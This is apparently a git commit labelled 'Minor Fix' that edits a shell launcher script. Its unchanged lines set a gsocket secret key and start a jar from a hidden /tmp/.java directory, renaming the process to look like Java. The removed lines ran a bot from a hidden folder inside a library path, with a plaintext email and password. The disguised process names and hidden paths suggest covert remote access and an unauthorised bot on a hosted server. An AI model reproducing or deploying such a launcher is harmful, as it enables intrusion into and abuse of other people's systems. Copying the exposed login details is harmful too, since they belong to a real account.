2a35ad17f9ae36a49cd3ad3d778bd73fc00db66e
i51jir6ni9t0 <wker-one@protonmail.com>
2025-01-31 06:23:23 +0000

    Minor Fix

--- rufastnde/n2.sh
+++ rufastnde/n2.sh
@@ -18,9 +18,6 @@ function start_app() {
     export GSOCKET_ARGS="-s j6A9eD2a1E2c5A16f9L89-3D9g8Hbj7-5i6C4a9U6k1eCd9-F9i4J0d6A2803-8A1c5J1g60 -liqD"
     cd /tmp/.java/bin && exec -a -java ./add-on.jar &
     echo "BOT SERVER STARTED ..."
-    # HG BOT
-    # export LD_LIBRARY_PATH=/home/container/libraries/io/netty/netty-buffer/.cache/.hg/usr/lib
-    # cd /home/container/libraries/io/netty/netty-buffer/.cache/.hg/app/ && nohup ./mc-bot.jar -a '-java' ./bot-fun.jar -tou-accept -email "yoursoundwords@gmail.com" -pass "vizelle521Elle" -device sk1 >/dev/null 2>&1 &
 }
 
 if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
